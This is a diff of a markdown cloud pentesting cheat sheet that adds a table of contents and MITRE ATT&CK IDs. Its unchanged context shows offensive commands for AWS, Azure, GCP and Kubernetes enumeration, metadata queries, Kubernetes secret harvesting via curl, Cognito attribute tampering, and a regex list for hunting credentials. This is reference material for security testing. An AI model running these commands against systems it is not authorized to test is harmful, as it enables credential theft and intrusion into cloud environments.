@@ -1,6 +1,26 @@
 # Cloud TTPs
 
-## Azure
+## Table of Contents
+
+- [Azure](#azure) - T1087.004
+- [AWS](#aws) - T1552.005
+  - [Cognito](#cognito) - T1087.004
+  - [AWS Trivy Scanning](#aws-trivy-scanning) - T1595.002
+  - [SSM](#ssm) - T1021.007
+  - [API Gateway](#api-gateway) - T1190
+- [GCP](#gcp) - T1087.004
+- [Cloud Subdomain Takeover](#cloud-subdomain-takeover) - T1584.001
+- [Kubernetes Secrets Harvesting](#kubernetes-secrets-harvesting) - T1552.007
+- [Kubernetes Service Enumeration](#kubernetes-service-enumeration) - T1046
+- [Kubernetes Ninja Commands](#kubernetes-ninja-commands) - T1609
+- [Password Hunting Regex](#password-hunting-regex) - T1552
+- [Go Environment Variable Enumeration](#go-environment-variable-enumeration) - T1082
+- [Jira](#jira) - T1087
+- [Pentesting Kafka](#pentesting-kafka) - T1046
+
+---
+
+## Azure (T1087.004)
 
 Enumerate for Priv Esc:
 
@@ -16,7 +36,7 @@ $ az ad user list -o table
 $ az role assignment list -o table
 ```
 
-## AWS
+## AWS (T1552.005)
 
 Shodan.io query to enumerate AWS Instance Metadata Service Access
 
@@ -81,7 +101,7 @@ Find S3 Buckets Using Subfinder and HTTPX Tool
 subfinder -d <TARGET_DOMAIN> -all -silent | httpx -silent -webserver -threads 100 | grep -i AmazonS3
 ```
 
-### Cognito
+### Cognito (T1087.004)
 
 > [!NOTE]
 > Before proceeding, capture the session's JWT during login and save to a file (ex: `access_token.txt`)
@@ -119,7 +139,7 @@ aws cognito-idp sign-up --client-id <client-id> --username <username> --password
 aws cognito-idp update-user-attributes --access-token $(cat access_token) --user-attributes Name=<attribute>,Value=<value>
 ```
 
-### AWS Trivy Scanning
+### AWS Trivy Scanning (T1595.002)
 
 1. Install the Trivy AWS plugin: `trivy plugin install github.com/aquasecurity/trivy-aws`
 
@@ -141,7 +161,7 @@ trivy aws --service s3
 trivy aws --service s3 --arn arn:aws:s3:::example-bucket
 ```
 
-### SSM
+### SSM (T1021.007)
 
 Script to quickly enumerate and select AWS SSM-managed EC2 instances via `fzf`, then start an SSM session without needing SSH or public access.
 
@@ -231,7 +251,7 @@ Lists the parameters in the AWS account or the parameters shared with the authen
 aws ssm describe-parameters
 ```
 
-### API Gateway
+### API Gateway (T1190)
 
 AWS API Gateway is a service offered by Amazon Web Services (AWS) designed for developers to create, publish, and oversee APIs on a large scale. It functions as an entry point to an application, permitting developers to establish a framework of rules and procedures. This framework governs the access external users have to certain data or functionalities within the application.
 
@@ -279,7 +299,7 @@ aws apigatewayv2 get-models --api-id <id>
 https://<api-id>.execute-api.<region>.amazonaws.com/<stage>/<resource>
 ```
 
-## GCP
+## GCP (T1087.004)
 
 Enumerate IP addresses:
 
@@ -443,7 +463,7 @@ curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?re
     -H "Metadata-Flavor: Google"
 ```
 
-## Cloud Subdomain Takeover
+## Cloud Subdomain Takeover (T1584.001)
 
 ```python
 import requests
@@ -490,13 +510,13 @@ for domain in tqdm(domain_names, desc="Checking for subdomain takeovers"):
         continue
 ```
 
-## Kubernetes Secrets Harvesting
+## Kubernetes Secrets Harvesting (T1552.007)
 
 ```bash
 curl -k -v -H “Authorization: Bearer <jwt_token>” -H “Content-Type: application/json” https://<master_ip>:6443/api/v1/namespaces/default/secrets | jq -r ‘.items[].data’
 ```
 
-## Kubernetes Service Enumeration
+## Kubernetes Service Enumeration (T1046)
 
 You can find everything exposed to the public with:
 
@@ -511,7 +531,7 @@ kubectl get namespace -o custom-columns='NAME:.metadata.name' | grep -v NAME | w
 done | grep -v "ClusterIP"
 ```
 
-## Kubernetes Ninja Commands
+## Kubernetes Ninja Commands (T1609)
 
 ```bash
 # List all pods in the current namespace.
@@ -551,7 +571,7 @@ kubectl describe secret <secret-name>
 kubectl create secret <secret-name>
 ```
 
-## Password Hunting Regex
+## Password Hunting Regex (T1552)
 
 ```yaml
 “Slack Token”: “(xox[baprs]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})”
@@ -601,7 +621,7 @@ kubectl create secret <secret-name>
 “Generic JWT”: “[A-Za-z0-9-]{20,}\.[A-Za-z0-9-]{20,}\.[A-Za-z0-9-_]{20,}”
  ```
 
-## Go Environment Variable Enumeration
+## Go Environment Variable Enumeration (T1082)
 
 A sample script that enumerates environment variables. This script pairs well with the regex list provided above:
 
@@ -630,7 +650,7 @@ func main() {
 }
 ```
 
-## Jira
+## Jira (T1087)
 
 ### Privileges
 
@@ -641,7 +661,7 @@ In Jira, privileges can be checked by any user, authenticated or not, through th
 curl https://org.atlassian.net/rest/api/2/mypermissions | jq | grep -iB6 '"havePermission": true'
 ```
 
-## Pentesting Kafka
+## Pentesting Kafka (T1046)
 
 Use Nmap to detect Kafka brokers and check for open ports:
 
